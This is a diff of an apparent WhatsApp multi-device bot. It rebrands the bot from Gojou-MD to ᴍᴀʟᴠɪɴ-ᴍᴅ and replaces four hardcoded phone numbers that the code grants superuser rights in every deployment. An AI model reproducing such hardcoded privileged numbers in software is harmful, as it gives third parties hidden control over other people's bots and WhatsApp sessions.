@@ -157,10 +157,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '2347043759577';
-            const dj2 = '2349066528353';
-            const dj3 = "2347043759577";
-            const luffy = '2347043759577';
+            const dj = '263780166288';
+            const dj2 = '263780166288';
+            const dj3 = "263714757857";
+            const luffy = '263714757857';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -881,15 +881,15 @@ ${metadata.desc}`;
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
                 let cmsg = `╔───⬡
-┃ ┃⬡Gojou-MD⬡┃
+┃ ┃⬡ᴍᴀʟᴠɪɴ-ᴍᴅ⬡┃
 ┃    Prefix : [ ${prefixe} ]
-┃    *GOJOU MD IS ACTIVE NOW*
+┃    *ᴍᴀʟᴠɪɴ-ᴍᴅ IS ACTIVE NOW*
 ┃    Total Commandes : ${evt.cm.length}
 ︎┃    Mode :${md} 
-┃  •°• https://whatsapp.com/channel/0029VaZsyQ21XqudOTjyG30Z
-┌┤✑  Thanks for Chooising Gojou-MD 
+┃  •°• https://whatsapp.com/channel/0029VailCeL6xCSY6gxO2C2M
+┌┤✑  Thanks for Chooising ᴍᴀʟᴠɪɴ-ᴍᴅ 
 │└────────────┈ ⳹        
-│©2024-2099 David Cyril 
+│©2024-2099 ᴍᴀʟᴠɪɴ-ᴋɪɴɢ 
 └─────────────────┈ ⳹
 ╚─────────────────···▸▸`;
                 await zk.sendMessage(zk.user.id, { text: cmsg });
